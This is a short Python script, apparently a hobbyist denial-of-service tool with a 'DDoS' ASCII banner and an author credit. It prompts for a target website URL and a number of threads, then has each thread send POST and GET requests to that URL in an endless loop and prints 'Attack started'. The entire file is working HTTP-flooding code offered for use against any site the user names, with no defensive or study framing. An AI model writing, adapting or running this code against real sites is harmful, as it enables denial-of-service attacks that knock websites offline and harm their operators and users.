import requests
import os 
from threading import Thread
from colorama import Fore, Back, Style

def cls():

  os.system('cls' if os.name=='nt' else 'clear')

cls()
print(Fore.GREEN + "")
ban = """
┏━━━┓╋┏┓╋╋╋╋╋╋┏━━━┳━━━┳━━━┓v1.0
┗┓┏┓┃╋┃┃╋╋╋╋╋╋┃┏━┓┃┏━━┫┏━━┛
╋┃┃┃┣━┛┣━━┳━━┓┗┛┏┛┃┗━━┫┗━━┓
╋┃┃┃┃┏┓┃┏┓┃━━┫┏┓┗┓┃┏━┓┣━━┓┃
┏┛┗┛┃┗┛┃┗┛┣━━┃┃┗━┛┃┗━┛┣━━┛┃
┗━━━┻━━┻━━┻━━┛┗━━━┻━━━┻━━━┛
ВНИМАНИЕ:Запускать программу строго на ПК
WARNING:Open this program only on PC
""" 
print(ban)
print("==========================")
print(Fore.RED + "Author: Pulatov Kamran(Tg: @Callistodev1)")
url = input('Введите URL сайта: ')
options = input('Кол-во запросов:')
# Complete DDoS bullshit made by Pulatov Kamran

def strike():
   while(1<10):
       spam = requests.post(url)
       spam2 = requests.get(url)

for i in range(int(options)):
   thr = Thread(target = strike)
   thr.start()
   print('Attack started')